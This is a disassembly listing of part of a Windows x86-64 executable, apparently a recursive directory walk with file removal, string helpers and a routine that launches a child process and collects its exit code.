   140004a4d:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   140004a54:	00 
   140004a55:	48 8b d3             	mov    %rbx,%rdx
   140004a58:	e8 c3 9b 00 00       	call   0x14000e620
   140004a5d:	80 bc 24 4f 10 00 00 	cmpb   $0x0,0x104f(%rsp)
   140004a64:	00 
   140004a65:	0f 85 93 01 00 00    	jne    0x140004bfe
   140004a6b:	80 bc 24 4f 20 00 00 	cmpb   $0x0,0x204f(%rsp)
   140004a72:	00 
   140004a73:	0f 85 85 01 00 00    	jne    0x140004bfe
   140004a79:	48 89 bc 24 80 40 00 	mov    %rdi,0x4080(%rsp)
   140004a80:	00 
   140004a81:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004a86:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140004a8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004a90:	48 ff c7             	inc    %rdi
   140004a93:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   140004a97:	75 f7                	jne    0x140004a90
   140004a99:	48 8d 15 b4 db 01 00 	lea    0x1dbb4(%rip),%rdx        # 0x140022654
   140004aa0:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   140004aa7:	00 
   140004aa8:	e8 df 9c 00 00       	call   0x14000e78c
   140004aad:	48 8b d8             	mov    %rax,%rbx
   140004ab0:	48 85 c0             	test   %rax,%rax
   140004ab3:	0f 84 f3 00 00 00    	je     0x140004bac
   140004ab9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004ac0:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140004ac4:	48 ff c1             	inc    %rcx
   140004ac7:	80 3c 0b 00          	cmpb   $0x0,(%rbx,%rcx,1)
   140004acb:	75 f7                	jne    0x140004ac4
   140004acd:	48 ff c7             	inc    %rdi
   140004ad0:	48 03 f9             	add    %rcx,%rdi
   140004ad3:	48 81 ff ff 0f 00 00 	cmp    $0xfff,%rdi
   140004ada:	0f 83 a9 00 00 00    	jae    0x140004b89
   140004ae0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004ae5:	48 ff c9             	dec    %rcx
   140004ae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004aef:	00 
   140004af0:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140004af4:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140004af8:	75 f6                	jne    0x140004af0
   140004afa:	0f b7 05 53 db 01 00 	movzwl 0x1db53(%rip),%eax        # 0x140022654
   140004b01:	66 89 01             	mov    %ax,(%rcx)
   140004b04:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004b09:	48 ff c8             	dec    %rax
   140004b0c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004b10:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140004b14:	48 8d 40 01          	lea    0x1(%rax),%rax
   140004b18:	75 f6                	jne    0x140004b10
   140004b1a:	33 d2                	xor    %edx,%edx
   140004b1c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004b20:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   140004b24:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   140004b27:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140004b2b:	84 c9                	test   %cl,%cl
   140004b2d:	75 f1                	jne    0x140004b20
   140004b2f:	48 8d 15 1e db 01 00 	lea    0x1db1e(%rip),%rdx        # 0x140022654
   140004b36:	33 c9                	xor    %ecx,%ecx
   140004b38:	e8 4f 9c 00 00       	call   0x14000e78c
   140004b3d:	48 8b d8             	mov    %rax,%rbx
   140004b40:	48 85 c0             	test   %rax,%rax
   140004b43:	74 67                	je     0x140004bac
   140004b45:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004b4b:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004b50:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004b57:	00 
   140004b58:	e8 53 0f 00 00       	call   0x140005ab0
   140004b5d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004b62:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004b69:	00 
   140004b6a:	e8 4d a4 00 00       	call   0x14000efbc
   140004b6f:	85 c0                	test   %eax,%eax
   140004b71:	0f 89 49 ff ff ff    	jns    0x140004ac0
   140004b77:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004b7e:	00 
   140004b7f:	e8 4c 0d 00 00       	call   0x1400058d0
   140004b84:	e9 37 ff ff ff       	jmp    0x140004ac0
   140004b89:	33 c0                	xor    %eax,%eax
   140004b8b:	48 8b bc 24 80 40 00 	mov    0x4080(%rsp),%rdi
   140004b92:	00 
   140004b93:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   140004b9a:	00 
   140004b9b:	48 33 cc             	xor    %rsp,%rcx
   140004b9e:	e8 6d 40 00 00       	call   0x140008c10
   140004ba3:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   140004baa:	5b                   	pop    %rbx
   140004bab:	c3                   	ret
   140004bac:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004bb2:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004bb7:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004bbe:	00 
   140004bbf:	e8 ec 0e 00 00       	call   0x140005ab0
   140004bc4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004bc9:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004bd0:	00 
   140004bd1:	e8 e6 a3 00 00       	call   0x14000efbc
   140004bd6:	85 c0                	test   %eax,%eax
   140004bd8:	75 11                	jne    0x140004beb
   140004bda:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004bdf:	48 8d 0d 22 ed 01 00 	lea    0x1ed22(%rip),%rcx        # 0x140023908
   140004be6:	e8 a5 d2 ff ff       	call   0x140001e90
   140004beb:	48 8d 15 4a ed 01 00 	lea    0x1ed4a(%rip),%rdx        # 0x14002393c
   140004bf2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004bf7:	e8 d4 e1 ff ff       	call   0x140002dd0
   140004bfc:	eb 8d                	jmp    0x140004b8b
   140004bfe:	33 c0                	xor    %eax,%eax
   140004c00:	eb 91                	jmp    0x140004b93
   140004c02:	cc                   	int3
   140004c03:	cc                   	int3
   140004c04:	cc                   	int3
   140004c05:	cc                   	int3
   140004c06:	cc                   	int3
   140004c07:	cc                   	int3
   140004c08:	cc                   	int3
   140004c09:	cc                   	int3
   140004c0a:	cc                   	int3
   140004c0b:	cc                   	int3
   140004c0c:	cc                   	int3
   140004c0d:	cc                   	int3
   140004c0e:	cc                   	int3
   140004c0f:	cc                   	int3
   140004c10:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004c15:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004c1a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004c1f:	55                   	push   %rbp
   140004c20:	48 8d ac 24 40 ac ff 	lea    -0x53c0(%rsp),%rbp
   140004c27:	ff 
   140004c28:	b8 c0 54 00 00       	mov    $0x54c0,%eax
   140004c2d:	e8 1e 40 00 00       	call   0x140008c50
   140004c32:	48 2b e0             	sub    %rax,%rsp
   140004c35:	48 8b 05 d4 d3 02 00 	mov    0x2d3d4(%rip),%rax        # 0x140032010
   140004c3c:	48 33 c4             	xor    %rsp,%rax
   140004c3f:	48 89 85 b0 53 00 00 	mov    %rax,0x53b0(%rbp)
   140004c46:	48 8b d1             	mov    %rcx,%rdx
   140004c49:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004c4f:	48 8d 8d a0 33 00 00 	lea    0x33a0(%rbp),%rcx
   140004c56:	e8 55 0e 00 00       	call   0x140005ab0
   140004c5b:	33 f6                	xor    %esi,%esi
   140004c5d:	8b ce                	mov    %esi,%ecx
   140004c5f:	90                   	nop
   140004c60:	0f b7 84 0d a0 33 00 	movzwl 0x33a0(%rbp,%rcx,1),%eax
   140004c67:	00 
   140004c68:	66 89 84 0d 80 03 00 	mov    %ax,0x380(%rbp,%rcx,1)
   140004c6f:	00 
   140004c70:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140004c74:	66 85 c0             	test   %ax,%ax
   140004c77:	75 e7                	jne    0x140004c60
   140004c79:	48 8d 85 80 03 00 00 	lea    0x380(%rbp),%rax
   140004c80:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140004c84:	48 ff c3             	inc    %rbx
   140004c87:	66 39 34 58          	cmp    %si,(%rax,%rbx,2)
   140004c8b:	75 f7                	jne    0x140004c84
   140004c8d:	0f b7 84 5d 7e 03 00 	movzwl 0x37e(%rbp,%rbx,2),%eax
   140004c94:	00 
   140004c95:	66 83 f8 2f          	cmp    $0x2f,%ax
   140004c99:	74 2a                	je     0x140004cc5
   140004c9b:	66 83 f8 5c          	cmp    $0x5c,%ax
   140004c9f:	74 24                	je     0x140004cc5
   140004ca1:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004ca8:	48 83 e9 02          	sub    $0x2,%rcx
   140004cac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004cb0:	66 39 71 02          	cmp    %si,0x2(%rcx)
   140004cb4:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140004cb8:	75 f6                	jne    0x140004cb0
   140004cba:	8b 05 40 ec 01 00    	mov    0x1ec40(%rip),%eax        # 0x140023900
   140004cc0:	48 ff c3             	inc    %rbx
   140004cc3:	89 01                	mov    %eax,(%rcx)
   140004cc5:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004ccc:	48 83 e9 02          	sub    $0x2,%rcx
   140004cd0:	66 39 71 02          	cmp    %si,0x2(%rcx)
   140004cd4:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140004cd8:	75 f6                	jne    0x140004cd0
   140004cda:	8b 05 24 ec 01 00    	mov    0x1ec24(%rip),%eax        # 0x140023904
   140004ce0:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140004ce7:	89 01                	mov    %eax,(%rcx)
   140004ce9:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004cf0:	e8 27 b6 00 00       	call   0x14001031c
   140004cf5:	48 8b f8             	mov    %rax,%rdi
   140004cf8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004cfc:	0f 84 36 02 00 00    	je     0x140004f38
   140004d02:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004d07:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004d0d:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140004d14:	0f 1f 40 00          	nopl   0x0(%rax)
   140004d18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004d1f:	00 
   140004d20:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   140004d27:	0f 10 02             	movups (%rdx),%xmm0
   140004d2a:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   140004d2e:	48 8d 92 80 00 00 00 	lea    0x80(%rdx),%rdx
   140004d35:	0f 11 41 80          	movups %xmm0,-0x80(%rcx)
   140004d39:	0f 10 42 a0          	movups -0x60(%rdx),%xmm0
   140004d3d:	0f 11 49 90          	movups %xmm1,-0x70(%rcx)
   140004d41:	0f 10 4a b0          	movups -0x50(%rdx),%xmm1
   140004d45:	0f 11 41 a0          	movups %xmm0,-0x60(%rcx)
   140004d49:	0f 10 42 c0          	movups -0x40(%rdx),%xmm0
   140004d4d:	0f 11 49 b0          	movups %xmm1,-0x50(%rcx)
   140004d51:	0f 10 4a d0          	movups -0x30(%rdx),%xmm1
   140004d55:	0f 11 41 c0          	movups %xmm0,-0x40(%rcx)
   140004d59:	0f 10 42 e0          	movups -0x20(%rdx),%xmm0
   140004d5d:	0f 11 49 d0          	movups %xmm1,-0x30(%rcx)
   140004d61:	0f 10 4a f0          	movups -0x10(%rdx),%xmm1
   140004d65:	0f 11 41 e0          	movups %xmm0,-0x20(%rcx)
   140004d69:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140004d6d:	49 83 e8 01          	sub    $0x1,%r8
   140004d71:	75 ad                	jne    0x140004d20
   140004d73:	0f 10 02             	movups (%rdx),%xmm0
   140004d76:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140004d7b:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   140004d7f:	0f 11 01             	movups %xmm0,(%rcx)
   140004d82:	0f 10 42 20          	movups 0x20(%rdx),%xmm0
   140004d86:	48 8b d3             	mov    %rbx,%rdx
   140004d89:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140004d8d:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140004d91:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004d98:	e8 93 04 00 00       	call   0x140005230
   140004d9d:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140004da4:	48 8b cf             	mov    %rdi,%rcx
   140004da7:	e8 78 b5 00 00       	call   0x140010324
   140004dac:	85 c0                	test   %eax,%eax
   140004dae:	0f 85 7c 01 00 00    	jne    0x140004f30
   140004db4:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140004db9:	ba 04 00 00 00       	mov    $0x4,%edx
   140004dbe:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   140004dc5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140004dcc:	00 00 00 00 
   140004dd0:	0f 10 01             	movups (%rcx),%xmm0
   140004dd3:	0f 10 49 10          	movups 0x10(%rcx),%xmm1
   140004dd7:	0f 11 00             	movups %xmm0,(%rax)
   140004dda:	0f 10 41 20          	movups 0x20(%rcx),%xmm0
   140004dde:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140004de2:	0f 10 49 30          	movups 0x30(%rcx),%xmm1
   140004de6:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140004dea:	0f 10 41 40          	movups 0x40(%rcx),%xmm0
   140004dee:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   140004df2:	0f 10 49 50          	movups 0x50(%rcx),%xmm1
   140004df6:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140004dfa:	0f 10 41 60          	movups 0x60(%rcx),%xmm0
   140004dfe:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   140004e02:	0f 10 49 70          	movups 0x70(%rcx),%xmm1
   140004e06:	48 83 e9 80          	sub    $0xffffffffffffff80,%rcx
   140004e0a:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140004e0e:	48 83 e8 80          	sub    $0xffffffffffffff80,%rax
   140004e12:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   140004e16:	48 83 ea 01          	sub    $0x1,%rdx
   140004e1a:	75 b4                	jne    0x140004dd0
   140004e1c:	0f 10 01             	movups (%rcx),%xmm0
   140004e1f:	0f 10 49 10          	movups 0x10(%rcx),%xmm1
   140004e23:	0f 11 00             	movups %xmm0,(%rax)
   140004e26:	0f 10 41 20          	movups 0x20(%rcx),%xmm0
   140004e2a:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140004e2e:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140004e32:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   140004e37:	66 3b 0d b6 ea 01 00 	cmp    0x1eab6(%rip),%cx        # 0x1400238f4
   140004e3e:	0f b7 44 24 46       	movzwl 0x46(%rsp),%eax
   140004e43:	75 0d                	jne    0x140004e52
   140004e45:	66 3b 05 aa ea 01 00 	cmp    0x1eaaa(%rip),%ax        # 0x1400238f6
   140004e4c:	0f 84 c7 00 00 00    	je     0x140004f19
   140004e52:	66 3b 0d 9f ea 01 00 	cmp    0x1ea9f(%rip),%cx        # 0x1400238f8
   140004e59:	75 1b                	jne    0x140004e76
   140004e5b:	66 3b 05 98 ea 01 00 	cmp    0x1ea98(%rip),%ax        # 0x1400238fa
   140004e62:	75 12                	jne    0x140004e76
   140004e64:	0f b7 44 24 48       	movzwl 0x48(%rsp),%eax
   140004e69:	66 3b 05 8c ea 01 00 	cmp    0x1ea8c(%rip),%ax        # 0x1400238fc
   140004e70:	0f 84 a3 00 00 00    	je     0x140004f19
   140004e76:	48 8d 85 80 03 00 00 	lea    0x380(%rbp),%rax
   140004e7d:	66 89 b4 5d 80 03 00 	mov    %si,0x380(%rbp,%rbx,2)
   140004e84:	00 
   140004e85:	48 83 e8 02          	sub    $0x2,%rax
   140004e89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004e90:	66 39 70 02          	cmp    %si,0x2(%rax)
   140004e94:	48 8d 40 02          	lea    0x2(%rax),%rax
   140004e98:	75 f6                	jne    0x140004e90
   140004e9a:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   140004e9f:	33 d2                	xor    %edx,%edx
   140004ea1:	0f 1f 40 00          	nopl   0x0(%rax)
   140004ea5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140004eac:	00 00 00 00 
   140004eb0:	41 0f b7 0c 50       	movzwl (%r8,%rdx,2),%ecx
   140004eb5:	66 89 0c 50          	mov    %cx,(%rax,%rdx,2)
   140004eb9:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140004ebd:	66 85 c9             	test   %cx,%cx
   140004ec0:	75 ee                	jne    0x140004eb0
   140004ec2:	f6 85 50 01 00 00 10 	testb  $0x10,0x150(%rbp)
   140004ec9:	74 27                	je     0x140004ef2
   140004ecb:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004ed1:	48 8d 95 80 03 00 00 	lea    0x380(%rbp),%rdx
   140004ed8:	48 8d 8d 90 23 00 00 	lea    0x2390(%rbp),%rcx
   140004edf:	e8 ac 0c 00 00       	call   0x140005b90
   140004ee4:	48 8d 8d 90 23 00 00 	lea    0x2390(%rbp),%rcx
   140004eeb:	e8 20 fd ff ff       	call   0x140004c10
   140004ef0:	eb 27                	jmp    0x140004f19
   140004ef2:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004ef9:	e8 3e bf 00 00       	call   0x140010e3c
   140004efe:	85 c0                	test   %eax,%eax
   140004f00:	74 17                	je     0x140004f19
   140004f02:	b9 64 00 00 00       	mov    $0x64,%ecx
   140004f07:	ff 15 5b d1 01 00    	call   *0x1d15b(%rip)        # 0x140022068
   140004f0d:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140004f14:	e8 23 bf 00 00       	call   0x140010e3c
   140004f19:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140004f20:	48 8b cf             	mov    %rdi,%rcx
   140004f23:	e8 fc b3 00 00       	call   0x140010324
   140004f28:	85 c0                	test   %eax,%eax
   140004f2a:	0f 84 84 fe ff ff    	je     0x140004db4
   140004f30:	48 8b cf             	mov    %rdi,%rcx
   140004f33:	e8 bc b3 00 00       	call   0x1400102f4
   140004f38:	48 8d 8d a0 33 00 00 	lea    0x33a0(%rbp),%rcx
   140004f3f:	e8 88 b0 00 00       	call   0x14000ffcc
   140004f44:	48 8b 8d b0 53 00 00 	mov    0x53b0(%rbp),%rcx
   140004f4b:	48 33 cc             	xor    %rsp,%rcx
   140004f4e:	e8 bd 3c 00 00       	call   0x140008c10
   140004f53:	4c 8d 9c 24 c0 54 00 	lea    0x54c0(%rsp),%r11
   140004f5a:	00 
   140004f5b:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140004f5f:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140004f63:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140004f67:	49 8b e3             	mov    %r11,%rsp
   140004f6a:	5d                   	pop    %rbp
   140004f6b:	c3                   	ret
   140004f6c:	cc                   	int3
   140004f6d:	cc                   	int3
   140004f6e:	cc                   	int3
   140004f6f:	cc                   	int3
   140004f70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004f7a:	57                   	push   %rdi
   140004f7b:	48 83 ec 20          	sub    $0x20,%rsp
   140004f7f:	48 8b da             	mov    %rdx,%rbx
   140004f82:	45 33 c0             	xor    %r8d,%r8d
   140004f85:	48 8b d1             	mov    %rcx,%rdx
   140004f88:	33 c9                	xor    %ecx,%ecx
   140004f8a:	e8 21 0b 00 00       	call   0x140005ab0
   140004f8f:	45 33 c0             	xor    %r8d,%r8d
   140004f92:	48 8b d3             	mov    %rbx,%rdx
   140004f95:	33 c9                	xor    %ecx,%ecx
   140004f97:	48 8b f0             	mov    %rax,%rsi
   140004f9a:	e8 11 0b 00 00       	call   0x140005ab0
   140004f9f:	48 8b d0             	mov    %rax,%rdx
   140004fa2:	48 8b ce             	mov    %rsi,%rcx
   140004fa5:	48 8b f8             	mov    %rax,%rdi
   140004fa8:	e8 e7 af 00 00       	call   0x14000ff94
   140004fad:	48 8b ce             	mov    %rsi,%rcx
   140004fb0:	8b d8                	mov    %eax,%ebx
   140004fb2:	e8 15 5e 00 00       	call   0x14000adcc
   140004fb7:	48 8b cf             	mov    %rdi,%rcx
   140004fba:	e8 0d 5e 00 00       	call   0x14000adcc
   140004fbf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004fc4:	8b c3                	mov    %ebx,%eax
   140004fc6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004fcb:	48 83 c4 20          	add    $0x20,%rsp
   140004fcf:	5f                   	pop    %rdi
   140004fd0:	c3                   	ret
   140004fd1:	cc                   	int3
   140004fd2:	cc                   	int3
   140004fd3:	cc                   	int3
   140004fd4:	cc                   	int3
   140004fd5:	cc                   	int3
   140004fd6:	cc                   	int3
   140004fd7:	cc                   	int3
   140004fd8:	cc                   	int3
   140004fd9:	cc                   	int3
   140004fda:	cc                   	int3
   140004fdb:	cc                   	int3
   140004fdc:	cc                   	int3
   140004fdd:	cc                   	int3
   140004fde:	cc                   	int3
   140004fdf:	cc                   	int3
   140004fe0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004fe5:	57                   	push   %rdi
   140004fe6:	48 83 ec 20          	sub    $0x20,%rsp
   140004fea:	48 8b d1             	mov    %rcx,%rdx
   140004fed:	45 33 c0             	xor    %r8d,%r8d
   140004ff0:	33 c9                	xor    %ecx,%ecx
   140004ff2:	e8 b9 0a 00 00       	call   0x140005ab0
   140004ff7:	33 d2                	xor    %edx,%edx
   140004ff9:	48 8b c8             	mov    %rax,%rcx
   140004ffc:	48 8b f8             	mov    %rax,%rdi
   140004fff:	ff 15 43 d0 01 00    	call   *0x1d043(%rip)        # 0x140022048
   140005005:	48 8b cf             	mov    %rdi,%rcx
   140005008:	8b d8                	mov    %eax,%ebx
   14000500a:	e8 bd 5d 00 00       	call   0x14000adcc
   14000500f:	8b c3                	mov    %ebx,%eax
   140005011:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005016:	48 83 c4 20          	add    $0x20,%rsp
   14000501a:	5f                   	pop    %rdi
   14000501b:	c3                   	ret
   14000501c:	cc                   	int3
   14000501d:	cc                   	int3
   14000501e:	cc                   	int3
   14000501f:	cc                   	int3
   140005020:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005025:	57                   	push   %rdi
   140005026:	b8 10 21 00 00       	mov    $0x2110,%eax
   14000502b:	e8 20 3c 00 00       	call   0x140008c50
   140005030:	48 2b e0             	sub    %rax,%rsp
   140005033:	48 8b 05 d6 cf 02 00 	mov    0x2cfd6(%rip),%rax        # 0x140032010
   14000503a:	48 33 c4             	xor    %rsp,%rax
   14000503d:	48 89 84 24 00 21 00 	mov    %rax,0x2100(%rsp)
   140005044:	00 
   140005045:	48 8b d1             	mov    %rcx,%rdx
   140005048:	33 ff                	xor    %edi,%edi
   14000504a:	48 8d 8c 24 00 01 00 	lea    0x100(%rsp),%rcx
   140005051:	00 
   140005052:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140005056:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000505c:	e8 4f 0a 00 00       	call   0x140005ab0
   140005061:	bb 01 00 00 00       	mov    $0x1,%ebx
   140005066:	8d 4f 16             	lea    0x16(%rdi),%ecx
   140005069:	8b d3                	mov    %ebx,%edx
   14000506b:	e8 e0 bb 00 00       	call   0x140010c50
   140005070:	8b d3                	mov    %ebx,%edx
   140005072:	8d 4f 02             	lea    0x2(%rdi),%ecx
   140005075:	e8 d6 bb 00 00       	call   0x140010c50
   14000507a:	8b d3                	mov    %ebx,%edx
   14000507c:	8d 4f 0f             	lea    0xf(%rdi),%ecx
   14000507f:	e8 cc bb 00 00       	call   0x140010c50
   140005084:	8b d3                	mov    %ebx,%edx
   140005086:	8d 4f 15             	lea    0x15(%rdi),%ecx
   140005089:	e8 c2 bb 00 00       	call   0x140010c50
   14000508e:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140005095:	00 
   140005096:	c7 44 24 58 18 00 00 	movl   $0x18,0x58(%rsp)
   14000509d:	00 
   14000509e:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400050a3:	89 5c 24 68          	mov    %ebx,0x68(%rsp)
   1400050a7:	ff 15 d3 cf 01 00    	call   *0x1cfd3(%rip)        # 0x140022080
   1400050ad:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400050b0:	48 89 bc 24 98 00 00 	mov    %rdi,0x98(%rsp)
   1400050b7:	00 
   1400050b8:	33 c9                	xor    %ecx,%ecx
   1400050ba:	66 0f 7f 84 24 a0 00 	movdqa %xmm0,0xa0(%rsp)
   1400050c1:	00 00 
   1400050c3:	c7 84 24 cc 00 00 00 	movl   $0x101,0xcc(%rsp)
   1400050ca:	01 01 00 00 
   1400050ce:	66 89 9c 24 d0 00 00 	mov    %bx,0xd0(%rsp)
   1400050d5:	00 
   1400050d6:	e8 d5 6c 00 00       	call   0x14000bdb0
   1400050db:	48 8b c8             	mov    %rax,%rcx
   1400050de:	e8 15 ab 00 00       	call   0x14000fbf8
   1400050e3:	8b c8                	mov    %eax,%ecx
   1400050e5:	e8 d6 b6 00 00       	call   0x1400107c0
   1400050ea:	8b cb                	mov    %ebx,%ecx
   1400050ec:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400050f3:	00 
   1400050f4:	e8 b7 6c 00 00       	call   0x14000bdb0
   1400050f9:	48 8b c8             	mov    %rax,%rcx
   1400050fc:	e8 f7 aa 00 00       	call   0x14000fbf8
   140005101:	8b c8                	mov    %eax,%ecx
   140005103:	e8 b8 b6 00 00       	call   0x1400107c0
   140005108:	8d 4f 02             	lea    0x2(%rdi),%ecx
   14000510b:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   140005112:	00 
   140005113:	e8 98 6c 00 00       	call   0x14000bdb0
   140005118:	48 8b c8             	mov    %rax,%rcx
   14000511b:	e8 d8 aa 00 00       	call   0x14000fbf8
   140005120:	8b c8                	mov    %eax,%ecx
   140005122:	e8 99 b6 00 00       	call   0x1400107c0
   140005127:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   14000512e:	00 
   14000512f:	ff 15 03 cf 01 00    	call   *0x1cf03(%rip)        # 0x140022038
   140005135:	45 33 c9             	xor    %r9d,%r9d
   140005138:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   14000513d:	48 8b d0             	mov    %rax,%rdx
   140005140:	48 8d 8c 24 00 01 00 	lea    0x100(%rsp),%rcx
   140005147:	00 
   140005148:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   14000514d:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140005152:	48 8d 84 24 90 00 00 	lea    0x90(%rsp),%rax
   140005159:	00 
   14000515a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000515f:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140005164:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140005169:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000516d:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005171:	ff 15 01 cf 01 00    	call   *0x1cf01(%rip)        # 0x140022078
   140005177:	85 c0                	test   %eax,%eax
   140005179:	74 24                	je     0x14000519f
   14000517b:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140005180:	83 ca ff             	or     $0xffffffff,%edx
   140005183:	ff 15 37 cf 01 00    	call   *0x1cf37(%rip)        # 0x1400220c0
   140005189:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000518e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140005193:	ff 15 d7 ce 01 00    	call   *0x1ced7(%rip)        # 0x140022070
   140005199:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000519d:	eb 16                	jmp    0x1400051b5
   14000519f:	48 8d 15 9a e7 01 00 	lea    0x1e79a(%rip),%rdx        # 0x140023940
   1400051a6:	48 8d 0d b3 e7 01 00 	lea    0x1e7b3(%rip),%rcx        # 0x140023960
   1400051ad:	e8 ae c9 ff ff       	call   0x140001b60
   1400051b2:	83 c8 ff             	or     $0xffffffff,%eax
   1400051b5:	48 8b 8c 24 00 21 00 	mov    0x2100(%rsp),%rcx
   1400051bc:	00 
   1400051bd:	48 33 cc             	xor    %rsp,%rcx
   1400051c0:	e8 4b 3a 00 00       	call   0x140008c10
   1400051c5:	48 8b 9c 24 28 21 00 	mov    0x2128(%rsp),%rbx
